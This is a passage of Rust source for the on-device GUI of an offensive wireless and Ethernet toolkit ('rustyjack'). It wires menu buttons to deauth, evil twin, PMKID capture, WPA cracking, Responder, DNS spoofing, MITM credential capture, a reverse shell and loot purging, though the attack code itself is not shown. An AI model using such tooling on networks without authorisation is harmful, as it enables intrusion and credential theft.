use std::{
    collections::HashSet,
    fs,
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Component, Path, PathBuf},
    process::Command,
    sync::mpsc::{self, TryRecvError},
    thread,
    time::{Duration, Instant, SystemTime},
};

use std::collections::HashMap;

use anyhow::{anyhow, bail, Context, Result};
use chrono::Local;
use rustyjack_core::cli::{
    AutopilotCommand, AutopilotMode, AutopilotStartArgs, Commands, DiscordCommand,
    DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
    EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, HardwareCommand,
    HotspotCommand, HotspotStartArgs, LootCommand, LootReadArgs, MitmCommand, MitmStartArgs,
    NotifyCommand, ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs,
    SystemCommand, WifiCommand, WifiDeauthArgs, WifiDisconnectArgs, WifiProfileCommand,
    WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiRouteCommand, WifiRouteEnsureArgs,
    WifiScanArgs, WifiStatusArgs,
};
use rustyjack_core::{
    apply_interface_isolation, is_wireless_interface, rfkill_index_for_interface,
    InterfaceSummary,
};
use serde::Deserialize;
use serde_json::{self, Value};
use tempfile::{NamedTempFile, TempPath};
use walkdir::WalkDir;
use zip::{write::FileOptions, CompressionMethod, ZipWriter};

#[cfg(target_os = "linux")]
use rustyjack_wireless::{
    crack::{
        generate_common_passwords, generate_ssid_passwords, CrackProgress, CrackResult,
        CrackerConfig, WpaCracker,
    },
    handshake::HandshakeExport,
};

use crate::{
    config::GuiConfig,
    core::CoreBridge,
    display::{
        wrap_text, DashboardView, Display, StatusOverlay, DIALOG_MAX_CHARS, DIALOG_VISIBLE_LINES,
    },
    input::{Button, ButtonPad},
    menu::{
        menu_title, ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, PipelineType,
        TxPowerSetting,
    },
    stats::StatsSampler,
};

fn count_lines(path: &Path) -> std::io::Result<usize> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().count())
}

// Response types for WiFi operations
#[derive(Debug, Deserialize)]
struct WifiNetworkEntry {
    ssid: Option<String>,
    bssid: Option<String>,
    signal_dbm: Option<i32>,
    channel: Option<u8>,
    encrypted: bool,
}

#[derive(Debug, Deserialize)]
struct WifiScanResponse {
    networks: Vec<WifiNetworkEntry>,
    count: usize,
}

#[derive(Debug, Deserialize)]
struct WifiProfileSummary {
    ssid: String,
    #[serde(default)]
    interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiProfilesResponse {
    profiles: Vec<WifiProfileSummary>,
}

#[derive(Debug, Deserialize)]
struct WifiListResponse {
    interfaces: Vec<InterfaceSummary>,
}

#[derive(Debug, Deserialize)]
struct RouteSnapshot {
    #[serde(default)]
    default_gateway: Option<String>,
    #[serde(default)]
    default_interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiStatusOverview {
    #[serde(default)]
    connected: bool,
    #[serde(default)]
    ssid: Option<String>,
    #[serde(default)]
    interface: Option<String>,
    #[serde(default)]
    signal_dbm: Option<i32>,
}

#[cfg(target_os = "linux")]
#[derive(Deserialize)]
struct HandshakeBundle {
    ssid: String,
    handshake: HandshakeExport,
}

#[derive(Debug, Deserialize)]
struct MacUsageRecord {
    ts: String,
    interface: String,
    mac: String,
    context: String,
    tag: String,
}

#[derive(Clone, Default)]
struct ArtifactItem {
    rel: String,
    kind: String,
    size: u64,
    modified: Option<SystemTime>,
    note: Option<String>,
    important: bool,
    pipeline_run: Option<String>,
}

#[derive(Default)]
struct PipelineStats {
    files: usize,
    captures: usize,
    creds: usize,
    visits: usize,
    logs: usize,
    latest: Option<SystemTime>,
}

#[derive(Default)]
struct TraversalResult {
    total_files: usize,
    counts: HashMap<String, usize>,
    items: Vec<ArtifactItem>,
    pipeline: HashMap<String, PipelineStats>,
    errors: Vec<String>,
}

#[cfg(target_os = "linux")]
#[derive(Clone)]
enum DictionaryOption {
    Quick {
        total: u64,
    },
    SsidPatterns {
        total: u64,
    },
    Bundled {
        name: String,
        path: PathBuf,
        total: u64,
    },
}

#[cfg(target_os = "linux")]
impl DictionaryOption {
    fn label(&self) -> String {
        match self {
            DictionaryOption::Quick { total } => format!("Quick (common+SSID) [{}]", total),
            DictionaryOption::SsidPatterns { total } => format!("SSID patterns [{}]", total),
            DictionaryOption::Bundled { name, total, .. } => {
                format!("{} [{}]", name, total)
            }
        }
    }
}

#[cfg(target_os = "linux")]
enum CrackUpdate {
    Progress {
        attempts: u64,
        total: u64,
        rate: f32,
        current: String,
    },
    Done {
        password: Option<String>,
        attempts: u64,
        total: u64,
        cancelled: bool,
    },
    Error(String),
}

#[cfg(target_os = "linux")]
struct CrackOutcome {
    password: Option<String>,
    attempts: u64,
    total_attempts: u64,
    elapsed: Duration,
    cancelled: bool,
}

pub struct App {
    core: CoreBridge,
    display: Display,
    buttons: ButtonPad,
    config: GuiConfig,
    menu: MenuTree,
    menu_state: MenuState,
    stats: StatsSampler,
    root: PathBuf,
    dashboard_view: Option<DashboardView>,
    active_mitm: Option<MitmSession>,
}

/// Result of checking for cancel during an attack
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CancelAction {
    Continue,   // User wants to continue attack
    GoBack,     // User wants to go back one menu
    GoMainMenu, // User wants to go to main menu
}

/// Result from pipeline execution
struct PipelineResult {
    cancelled: bool,
    steps_completed: usize,
    pmkids_captured: u32,
    handshakes_captured: u32,
    password_found: Option<String>,
    networks_found: u32,
    clients_found: u32,
}

const INDEFINITE_SECS: u32 = 86_400; // 24h stand-in for "run until stopped"

enum StepOutcome {
    Completed(Option<(u32, u32, Option<String>, u32, u32)>),
    Skipped(String),
}

struct PurgeReport {
    removed: usize,
    service_disabled: bool,
    errors: Vec<String>,
}

#[derive(Clone)]
struct MitmSession {
    started: Instant,
    site: Option<String>,
    visit_log: Option<PathBuf>,
    cred_log: Option<PathBuf>,
}

// Map low-level Button values to higher-level ButtonAction values
impl App {
    fn map_button(&self, b: Button) -> ButtonAction {
        match b {
            Button::Up => ButtonAction::Up,
            Button::Down => ButtonAction::Down,
            Button::Left => ButtonAction::Back,
            Button::Right | Button::Select => ButtonAction::Select,
            Button::Key1 => ButtonAction::Refresh,
            Button::Key2 => ButtonAction::MainMenu,
            Button::Key3 => ButtonAction::Reboot,
        }
    }

    fn show_wifi_status(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("WiFi Status")? else {
            return Ok(());
        };
        let status = match self.fetch_wifi_status(Some(iface.clone())) {
            Ok(s) => s,
            Err(e) => {
                return self.show_message(
                    "WiFi Status",
                    [
                        "Failed to read WiFi status",
                        &shorten_for_display(&e.to_string(), 90),
                    ],
                );
            }
        };
        let route = self.fetch_route_snapshot().ok();

        let mut lines = Vec::new();
        lines.push(format!(
            "Connected: {}",
            if status.connected { "YES" } else { "NO" }
        ));
        if let Some(ssid) = status.ssid {
            lines.push(format!("SSID: {}", ssid));
        }
        if let Some(intf) = status.interface {
            lines.push(format!("Iface: {}", intf));
        }
        if let Some(sig) = status.signal_dbm {
            lines.push(format!("Signal: {} dBm", sig));
        }
        if let Some(rt) = route {
            if let Some(gw) = rt.default_gateway {
                lines.push(format!("Gateway: {}", gw));
            }
            if let Some(di) = rt.default_interface {
                lines.push(format!("Default: {}", di));
            }
        }
        if !status.connected {
            lines.push("No active connection detected.".to_string());
        }

        if lines.len() == 1 {
            lines.push("No WiFi info found".to_string());
        }

        self.show_message("WiFi Status", lines.iter().map(|s| s.as_str()))
    }

    fn disconnect_wifi(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        if active_interface.is_empty() {
            return self.show_message("WiFi", ["No active interface set"]);
        }
        match self.core.dispatch(Commands::Wifi(WifiCommand::Disconnect(
            WifiDisconnectArgs {
                interface: Some(active_interface.clone()),
            },
        ))) {
            Ok((msg, _)) => self.show_message("WiFi", [msg]),
            Err(e) => self.show_message("WiFi", [format!("Disconnect failed: {}", e)]),
        }
    }

    fn ensure_route(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        if active_interface.is_empty() {
            return self.show_message("Route", ["No active interface set"]);
        }

        match self.ensure_route_for_interface(&active_interface) {
            Ok(Some(msg)) => self.show_message("Route", [msg]),
            Ok(None) => Ok(()),
            Err(e) => self.show_message("Route", [format!("Route failed: {}", e)]),
        }
    }

    fn require_connected_wireless(&mut self, title: &str) -> Result<Option<String>> {
        let iface = self.config.settings.active_network_interface.clone();
        if iface.is_empty() {
            self.show_message(title, ["No active interface set", "Run Hardware Detect first"])?;
            return Ok(None);
        }

        let wireless_dir = format!("/sys/class/net/{}/wireless", iface);
        if !Path::new(&wireless_dir).exists() {
            self.show_message(
                title,
                [
                    &format!("Interface: {}", iface),
                    "Requires wireless interface",
                    "connected with an IP.",
                ],
            )?;
            return Ok(None);
        }

        if !self.interface_has_carrier(&iface) {
            self.show_message(
                title,
                [
                    &format!("Interface: {}", iface),
                    "Link is down / no AP",
                    "Connect first, then retry",
                ],
            )?;
            return Ok(None);
        }

        if !interface_has_ip(&iface) {
            self.show_message(
                title,
                [
                    &format!("Interface: {}", iface),
                    "No IPv4 address.",
                    "Connect to a network",
                    "before running this.",
                ],
            )?;
            return Ok(None);
        }

        if !self.mode_allows_active("Blocked in Stealth mode")? {
            return Ok(None);
        }

        Ok(Some(iface))
    }

    fn ensure_route_for_interface(&mut self, interface: &str) -> Result<Option<String>> {
        if interface.is_empty() {
            return Ok(None);
        }

        let args = WifiRouteEnsureArgs {
            interface: interface.to_string(),
        };

        let result = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
                args,
            ))));

        match result {
            Ok((msg, _)) => {
                // Keep only the active interface alive (plus hotspot if running)
                let mut allow_list = vec![interface.to_string()];
                if let Ok((_, hs_data)) =
                    self.core
                        .dispatch(Commands::Hotspot(HotspotCommand::Status))
                {
                    let running = hs_data
                        .get("running")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false);
                    if running {
                        if let Some(ap) = hs_data.get("ap_interface").and_then(|v| v.as_str()) {
                            if !ap.is_empty() {
                                allow_list.push(ap.to_string());
                            }
                        }
                        if let Some(up) =
                            hs_data.get("upstream_interface").and_then(|v| v.as_str())
                        {
                            if !up.is_empty() {
                                allow_list.push(up.to_string());
                            }
                        }
                    }
                }
                allow_list.retain(|s| !s.is_empty());
                self.apply_interface_isolation(&allow_list)?;
                Ok(Some(msg))
            }
            Err(e) => {
                let err = e.to_string();
                let mut lines = vec![format!("Route failed for {}", interface)];
                lines.push(shorten_for_display(&err, 90));
                if err.contains("No gateway found") {
                    lines.push("No gateway detected; connect first.".to_string());
                }
                self.show_message("Route", lines)?;
                Ok(None)
            }
        }
    }

    fn apply_interface_isolation(&mut self, allowed: &[String]) -> Result<()> {
        apply_interface_isolation(allowed)
    }

    fn status_overlay(&self) -> StatusOverlay {
        let mut status = self.stats.snapshot();
        let settings = &self.config.settings;

        status.target_network = settings.target_network.clone();
        status.target_bssid = settings.target_bssid.clone();
        status.target_channel = settings.target_channel;
        status.active_interface = settings.active_network_interface.clone();

        let interface_mac = self.read_interface_mac(&settings.active_network_interface);
        let interface_name = &settings.active_network_interface;
        let current_mac = interface_mac
            .clone()
            .or_else(|| settings.current_macs.get(interface_name).cloned())
            .unwrap_or_default();
        let original_mac = settings
            .original_macs
            .get(interface_name)
            .cloned()
            .unwrap_or_else(|| interface_mac.unwrap_or_else(|| current_mac.clone()));

        status.current_mac = current_mac.to_uppercase();
        status.original_mac = original_mac.to_uppercase();

        status
    }

    fn read_interface_mac(&self, interface: &str) -> Option<String> {
        if interface.is_empty() {
            return None;
        }
        let path = format!("/sys/class/net/{}/address", interface);
        fs::read_to_string(&path)
            .ok()
            .map(|mac| mac.trim().to_uppercase())
    }

    fn is_ethernet_interface(&self, interface: &str) -> bool {
        if interface.is_empty() {
            return false;
        }
        let wireless_dir = format!("/sys/class/net/{}/wireless", interface);
        !Path::new(&wireless_dir).exists()
    }

    fn interface_has_carrier(&self, interface: &str) -> bool {
        if interface.is_empty() {
            return false;
        }
        let carrier_path = format!("/sys/class/net/{}/carrier", interface);
        match fs::read_to_string(&carrier_path) {
            Ok(val) => val.trim() == "1",
            Err(_) => false,
        }
    }

    fn confirm_reboot(&mut self) -> Result<()> {
        // Ask the user to confirm reboot — waits for explicit confirmation
        let overlay = self.stats.snapshot();
        let content = vec![
            "Confirm reboot".to_string(),
            "SELECT = Reboot".to_string(),
            "LEFT = Cancel".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // Run reboot command and then exit
                    let _ = Command::new("systemctl").arg("reboot").status();
                    // If the command succeeded the system will reboot; exit the app regardless.
                    std::process::exit(0);
                }
                ButtonAction::Back | ButtonAction::MainMenu => {
                    // Cancel and return
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog
                    self.display.draw_dialog(&content, &overlay)?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    /// Check if user pressed cancel button during attack, show confirmation dialog
    fn check_attack_cancel(&mut self, attack_name: &str) -> Result<CancelAction> {
        // Non-blocking check for button press
        if let Some(button) = self.buttons.try_read()? {
            let action = self.map_button(button);
            match action {
                ButtonAction::Back => {
                    return self.confirm_cancel_attack(attack_name, CancelAction::GoBack);
                }
                ButtonAction::MainMenu => {
                    return self.confirm_cancel_attack(attack_name, CancelAction::GoMainMenu);
                }
                _ => {}
            }
        }
        Ok(CancelAction::Continue)
    }

    /// Show cancel confirmation dialog
    fn confirm_cancel_attack(
        &mut self,
        attack_name: &str,
        cancel_to: CancelAction,
    ) -> Result<CancelAction> {
        let overlay = self.stats.snapshot();
        let dest = match cancel_to {
            CancelAction::GoBack => "previous menu",
            CancelAction::GoMainMenu => "main menu",
            CancelAction::Continue => return Ok(CancelAction::Continue),
        };

        let content = vec![
            format!("Cancel {}?", attack_name),
            "".to_string(),
            format!("Return to {}", dest),
            "".to_string(),
            "SELECT = Cancel attack".to_string(),
            "LEFT = Continue attack".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // User confirmed cancel
                    return Ok(cancel_to);
                }
                ButtonAction::Back | ButtonAction::Refresh => {
                    // User wants to continue attack
                    return Ok(CancelAction::Continue);
                }
                ButtonAction::MainMenu => {
                    // Change to go to main menu instead
                    return Ok(CancelAction::GoMainMenu);
                }
                _ => {}
            }
        }
    }

    /// Run a command with cancel support - shows progress and allows user to cancel
    /// Returns Ok(Some(result)) if completed, Ok(None) if cancelled
    fn dispatch_cancellable(
        &mut self,
        attack_name: &str,
        cmd: Commands,
        duration_secs: u64,
    ) -> Result<Option<(String, serde_json::Value)>> {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        let core = self.core.clone();
        let result: Arc<Mutex<Option<Result<(String, serde_json::Value)>>>> =
            Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);

        // Spawn command in background
        thread::spawn(move || {
            let r = core.dispatch(cmd);
            *result_clone.lock()
                .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))
                .unwrap_or_else(|_| panic!("Failed to lock result mutex")) = Some(r);
        });

        let start = std::time::Instant::now();
        let mut last_displayed_secs: u64 = u64::MAX; // Force initial draw

        loop {
            let elapsed = start.elapsed().as_secs();

            // Check for cancel (non-blocking button check)
            match self.check_attack_cancel(attack_name)? {
                CancelAction::Continue => {}
                CancelAction::GoBack => {
                    self.show_message(
                        &format!("{} Cancelled", attack_name),
                        [
                            "Attack stopped early",
                            "",
                            "Partial results may be",
                            "saved in loot folder",
                        ],
                    )?;
                    return Ok(None);
                }
                CancelAction::GoMainMenu => {
                    self.menu_state.home();
                    self.show_message(
                        &format!("{} Cancelled", attack_name),
                        [
                            "Attack stopped early",
                            "",
                            "Partial results may be",
                            "saved in loot folder",
                        ],
                    )?;
                    return Ok(None);
                }
            }

            // Check if completed
            if let Some(r) = result.lock()
                .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
                .take() {
                return Ok(Some(r?));
            }

            // Only redraw if seconds changed (reduces flicker significantly)
            if elapsed != last_displayed_secs {
                last_displayed_secs = elapsed;

                let progress = if duration_secs > 0 {
                    (elapsed as f32 / duration_secs as f32).min(1.0) * 100.0
                } else {
                    0.0
                };

                let msg = if duration_secs > 0 && elapsed < duration_secs {
                    format!("{}s/{}s [LEFT=Cancel]", elapsed, duration_secs)
                } else if duration_secs > 0 {
                    "Finalizing... [LEFT=Cancel]".to_string()
                } else {
                    format!("Elapsed: {}s [LEFT/Main=Stop]", elapsed)
                };

                let overlay = self.stats.snapshot();
                self.display
                    .draw_progress_dialog(attack_name, &msg, progress, &overlay)?;
            }

            // Sleep briefly between button checks (50ms for responsive cancellation)
            thread::sleep(Duration::from_millis(50));
        }
    }
}

struct MenuState {
    stack: Vec<String>,
    selection: usize,
    // Scroll offset for current menu view — ensures selection stays visible
    offset: usize,
}

impl MenuState {
    fn new() -> Self {
        Self {
            stack: vec!["a".to_string()],
            selection: 0,
            offset: 0,
        }
    }

    fn current_id(&self) -> &str {
        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
    }

    fn enter(&mut self, id: &str) {
        self.stack.push(id.to_string());
        self.selection = 0;
        self.offset = 0;
    }

    fn back(&mut self) {
        if self.stack.len() > 1 {
            self.stack.pop();
            self.selection = 0;
            self.offset = 0;
        }
    }

    fn move_up(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        if self.selection == 0 {
            self.selection = total - 1;
        } else {
            self.selection -= 1;
        }
        // Ensure selection is inside visible window
        const VISIBLE: usize = 9;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn move_down(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        self.selection = (self.selection + 1) % total;
        // Ensure selection is inside visible window
        const VISIBLE: usize = 9;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn home(&mut self) {
        self.stack = vec!["a".to_string()];
        self.selection = 0;
        self.offset = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ButtonAction {
    Up,
    Down,
    Back,
    Select,
    Refresh,
    MainMenu,
    Reboot,
}

impl App {
    pub fn new() -> Result<Self> {
        let core = CoreBridge::with_root(None)?;
        let root = core.root().to_path_buf();
        let config = GuiConfig::load(&root)?;
        let mut display = Display::new(&config.colors)?;
        let buttons = ButtonPad::new(&config.pins)?;

        // Show splash screen during initialization
        let splash_path = root.join("img").join("rustyjack.png");
        let _ = display.show_splash_screen(&splash_path);

        // Let splash show while stats sampler starts up
        let stats = StatsSampler::spawn(core.clone());

        // Give splash screen time to be visible (1.5 seconds)
        thread::sleep(Duration::from_millis(1500));

        let app = Self {
            core,
            display,
            buttons,
            config,
            menu: MenuTree::new(),
            menu_state: MenuState::new(),
            stats,
            root,
            dashboard_view: None,
            active_mitm: None,
        };
        // Apply log preference from config at startup so the backend honors it
        app.apply_log_setting();
        Ok(app)
    }

    pub fn run(mut self) -> Result<()> {
        loop {
            if let Some(view) = self.dashboard_view {
                // Dashboard mode
                let status = self.status_overlay();
                self.display.draw_dashboard(view, &status)?;

                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Back => {
                        // Exit dashboard, return to menu
                        self.dashboard_view = None;
                    }
                    ButtonAction::Select => {
                        // Cycle to next dashboard
                        self.dashboard_view = Some(match view {
                            DashboardView::SystemHealth => DashboardView::TargetStatus,
                            DashboardView::TargetStatus => DashboardView::MacStatus,
                            DashboardView::MacStatus => DashboardView::NetworkInterfaces,
                            DashboardView::NetworkInterfaces => DashboardView::SystemHealth,
                        });
                    }
                    ButtonAction::Refresh => {
                        // force redraw; nothing else required (loop will redraw)
                    }
                    ButtonAction::MainMenu => {
                        // Exit dashboard and go to main menu
                        self.dashboard_view = None;
                        self.menu_state.home();
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            } else {
                // Menu mode
                let entries = self.render_menu()?;
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Up => self.menu_state.move_up(entries.len()),
                    ButtonAction::Down => self.menu_state.move_down(entries.len()),
                    ButtonAction::Back => self.menu_state.back(),
                    ButtonAction::Select => {
                        if let Some(entry) = entries.get(self.menu_state.selection) {
                            let action = entry.action.clone();
                            self.execute_action(action)?;
                        }
                    }
                    ButtonAction::Refresh => {
                        // Force refresh — nothing required here because the loop redraws
                    }
                    ButtonAction::MainMenu => self.menu_state.home(),
                    ButtonAction::Reboot => self.confirm_reboot()?,
                }
            }
        }
    }

    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
        let mut entries = self.menu.entries(self.menu_state.current_id())?;

        // Dynamic label updates based on current settings
        for entry in &mut entries {
            match &entry.action {
                MenuAction::ToggleDiscord => {
                    let state = if self.config.settings.discord_enabled {
                        "ON"
                    } else {
                        "OFF"
                    };
                    entry.label = format!("Discord [{}]", state);
                }
                MenuAction::ToggleLogs => {
                    let state = if self.config.settings.logs_enabled {
                        "ON"
                    } else {
                        "OFF"
                    };
                    entry.label = format!("Logs [{}]", state);
                }
                MenuAction::ToggleMacRandomization => {
                    let state = if self.config.settings.mac_randomization_enabled {
                        "ON"
                    } else {
                        "OFF"
                    };
                    entry.label = format!("Auto MAC [{}]", state);
                }
                MenuAction::ToggleHostnameRandomization => {
                    let state = if self.config.settings.hostname_randomization_enabled {
                        "ON"
                    } else {
                        "OFF"
                    };
                    entry.label = format!("Auto Hostname [{}]", state);
                }
                MenuAction::TogglePassiveMode => {
                    let state = if self.config.settings.passive_mode_enabled {
                        "ON"
                    } else {
                        "OFF"
                    };
                    entry.label = format!("Passive [{}]", state);
                }
                MenuAction::Submenu("aops") => {
                    entry.label = format!("Mode: {}", self.mode_display_name());
                }
                MenuAction::SetOperationMode(mode) => {
                    let name = self.mode_display(*mode);
                    let active = self
                        .config
                        .settings
                        .operation_mode
                        .eq_ignore_ascii_case(mode);
                    let prefix = if active { "*" } else { " " };
                    entry.label = format!("{} {}", prefix, name);
                }
                MenuAction::SetTxPower(level) => {
                    let (base, key) = Self::tx_power_label(*level);
                    let active = self
                        .config
                        .settings
                        .tx_power_level
                        .eq_ignore_ascii_case(key);
                    let prefix = if active { "*" } else { " " };
                    entry.label = format!("{} {}", prefix, base);
                }
                _ => {}
            }
        }

        if entries.is_empty() {
            entries.push(MenuEntry {
                label: " Nothing here".to_string(),
                action: MenuAction::ShowInfo,
            });
        }
        if self.menu_state.selection >= entries.len() {
            self.menu_state.selection = entries.len().saturating_sub(1);
        }
        let status = self.status_overlay();
        // When there are more entries than fit on-screen, show a sliding window
        // so the selected item is always visible. MenuState::offset tracks the
        // first item index in the current view.
        const VISIBLE: usize = 9;
        let total = entries.len();
        if self.menu_state.selection >= total && total > 0 {
            self.menu_state.selection = total - 1;
        }
        // clamp offset
        if self.menu_state.offset >= total {
            self.menu_state.offset = 0;
        }

        let start = self.menu_state.offset.min(total);
        let _end = (start + VISIBLE).min(total);

        let labels: Vec<String> = entries
            .iter()
            .skip(start)
            .take(VISIBLE)
            .map(|entry| entry.label.clone())
            .collect();

        // selected index relative to the slice
        let displayed_selected = if total == 0 {
            0
        } else {
            self.menu_state.selection.saturating_sub(start)
        };

        self.display.draw_menu(
            menu_title(self.menu_state.current_id()),
            &labels,
            displayed_selected,
            &status,
        )?;
        Ok(entries)
    }

    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
        match action {
            MenuAction::Submenu(id) => self.menu_state.enter(id),
            MenuAction::RefreshConfig => self.reload_config()?,
            MenuAction::SaveConfig => self.save_config()?,
            MenuAction::SetColor(target) => self.pick_color(target)?,
            MenuAction::RestartSystem => self.restart_system()?,
            MenuAction::SecureShutdown => self.secure_shutdown()?,
            MenuAction::Loot(section) => self.show_loot(section)?,
            MenuAction::DiscordUpload => self.discord_upload()?,
            MenuAction::ToggleLogs => self.toggle_logs()?,
            MenuAction::ViewDashboards => {
                self.dashboard_view = Some(DashboardView::SystemHealth);
            }
            MenuAction::ToggleDiscord => self.toggle_discord()?,
            MenuAction::TransferToUSB => self.transfer_to_usb()?,
            MenuAction::HardwareDetect => self.show_hardware_detect()?,
            MenuAction::InstallWifiDrivers => self.install_wifi_drivers()?,
            MenuAction::ScanNetworks => self.scan_wifi_networks()?,
            MenuAction::DeauthAttack => self.launch_deauth_attack()?,
            MenuAction::ConnectKnownNetwork => self.connect_known_network()?,
            MenuAction::EvilTwinAttack => self.launch_evil_twin()?,
            MenuAction::ProbeSniff => self.launch_probe_sniff()?,
            MenuAction::PmkidCapture => self.launch_pmkid_capture()?,
            MenuAction::CrackHandshake => self.launch_crack_handshake()?,
            MenuAction::KarmaAttack => self.launch_karma_attack()?,
            MenuAction::WifiStatus => self.show_wifi_status()?,
            MenuAction::WifiDisconnect => self.disconnect_wifi()?,
            MenuAction::WifiEnsureRoute => self.ensure_route()?,
            MenuAction::ReconGateway => self.recon_gateway()?,
            MenuAction::ReconArpScan => self.recon_arp_scan()?,
            MenuAction::ReconServiceScan => self.recon_service_scan()?,
            MenuAction::ReconMdnsScan => self.recon_mdns_scan()?,
            MenuAction::ReconBandwidth => self.recon_bandwidth()?,
            MenuAction::ReconDnsCapture => self.recon_dns_capture()?,
            MenuAction::ResponderOn => self.start_responder()?,
            MenuAction::ResponderOff => self.stop_responder()?,
            MenuAction::DnsSpoofStart => self.start_dns_spoof()?,
            MenuAction::DnsSpoofStop => self.stop_dns_spoof()?,
            MenuAction::ReverseShell => self.launch_reverse_shell()?,
            MenuAction::AutopilotStart(mode) => self.start_autopilot(mode)?,
            MenuAction::AutopilotStop => self.stop_autopilot()?,
            MenuAction::AutopilotStatus => self.show_autopilot_status()?,
            MenuAction::AttackPipeline(pipeline_type) => {
                if let Err(e) = self.launch_attack_pipeline(pipeline_type) {
                    let msg = shorten_for_display(&e.to_string(), 20);
                    self.show_message("Pipeline Error", [msg])?;
                }
            }
            MenuAction::ToggleMacRandomization => self.toggle_mac_randomization()?,
            MenuAction::ToggleHostnameRandomization => self.toggle_hostname_randomization()?,
            MenuAction::RandomizeMacNow => self.randomize_mac_now()?,
            MenuAction::SetVendorMac => self.set_vendor_mac()?,
            MenuAction::RandomizeHostnameNow => self.randomize_hostname_now()?,
            MenuAction::RestoreMac => self.restore_mac()?,
            MenuAction::SetTxPower(level) => self.set_tx_power(level)?,
            MenuAction::TogglePassiveMode => self.toggle_passive_mode()?,
            MenuAction::PassiveRecon => self.launch_passive_recon()?,
            MenuAction::EthernetDiscovery => self.launch_ethernet_discovery()?,
            MenuAction::EthernetPortScan => self.launch_ethernet_port_scan()?,
            MenuAction::EthernetInventory => self.launch_ethernet_inventory()?,
            MenuAction::EthernetMitm => self.launch_ethernet_mitm()?,
            MenuAction::EthernetMitmStatus => self.show_mitm_status()?,
            MenuAction::EthernetMitmStop => self.stop_ethernet_mitm()?,
            MenuAction::EthernetSiteCredPipeline => self.menu_state.enter("aethp"),
            MenuAction::EthernetSiteCredCapture => self.launch_ethernet_site_cred_capture()?,
            MenuAction::BuildNetworkReport => self.build_network_report()?,
            MenuAction::CompletePurge => self.complete_purge()?,
            MenuAction::PurgeLogs => self.purge_logs()?,
            MenuAction::Hotspot => self.manage_hotspot()?,
            MenuAction::SetOperationMode(mode) => self.select_operation_mode(mode)?,
            MenuAction::ShowInfo => {} // No-op for informational entries
        }
        Ok(())
    }

    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
        if let Err(err) = self.core.dispatch(command) {
            self.show_message("Error", [format!("{err}")])?;
        } else {
            self.show_message("Success", [success.to_string()])?;
        }
        Ok(())
    }

    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();

        // Pre-compute wrapped body lines so we know when scrolling is needed
        let wrapped_body: Vec<String> = content
            .iter()
            .skip(1)
            .flat_map(|line| wrap_text(line, DIALOG_MAX_CHARS))
            .collect();
        let total_lines = wrapped_body.len();

        let mut offset: usize = 0;
        let mut needs_redraw = true;

        // Draw the dialog and require an explicit button press to dismiss
        loop {
            if needs_redraw {
                self.display
                    .draw_dialog_with_offset(&content, offset, &overlay)?;
                needs_redraw = false;
            }

            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if offset > 0 {
                        offset -= 1;
                        needs_redraw = true;
                    }
                }
                ButtonAction::Down => {
                    if offset + DIALOG_VISIBLE_LINES < total_lines {
                        offset += 1;
                        needs_redraw = true;
                    }
                }
                ButtonAction::Select | ButtonAction::Back => break,
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog so user can refresh view content if desired
                    needs_redraw = true;
                }
                ButtonAction::Reboot => {
                    // confirm and perform reboot if accepted
                    self.confirm_reboot()?;
                    needs_redraw = true;
                }
            }
        }
        Ok(())
    }

    fn show_progress<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
